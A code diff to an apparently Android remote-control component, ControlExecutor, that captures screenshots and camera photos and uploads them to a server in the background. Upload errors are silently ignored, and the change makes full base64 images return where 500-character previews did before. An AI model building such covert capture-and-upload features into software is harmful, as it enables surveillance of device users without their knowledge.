@@ -265,13 +265,14 @@ object ControlExecutor {
                 val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                 FileOutputStream(file).use { it.write(stream.toByteArray()) }
                 
-                // Upload to server
+                // Upload to server (file will be cached for streaming viewer)
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
                         ApiClient.uploadFile(file, "screenshot")
                     } catch (_: Exception) {}
                 }
                 
+                // Return full base64 for streaming viewer (server caches this)
                 return mapOf(
                     "status" to "success",
                     "message" to "Screenshot captured",
@@ -279,7 +280,7 @@ object ControlExecutor {
                     "height" to resultBitmap!!.height,
                     "size" to stream.size(),
                     "file" to file.name,
-                    "base64_preview" to base64.take(500) + "..."
+                    "base64_preview" to base64
                 )
             } else {
                 return mapOf("error" to (error ?: "Failed to capture screen"))
@@ -361,7 +362,7 @@ object ControlExecutor {
                         val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
                         FileOutputStream(file).use { it.write(bytes) }
                         
-                        // Upload in background
+                        // Upload in background (with device_id for server identification)
                         CoroutineScope(Dispatchers.IO).launch {
                             try { ApiClient.uploadFile(file, "camera") } catch (_: Exception) {}
                         }
@@ -434,7 +435,7 @@ object ControlExecutor {
                     "width" to resultBitmap!!.width,
                     "height" to resultBitmap!!.height,
                     "size" to stream.size(),
-                    "base64_preview" to base64.take(500) + "..."
+                    "base64_preview" to base64
                 )
             } else {
                 return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
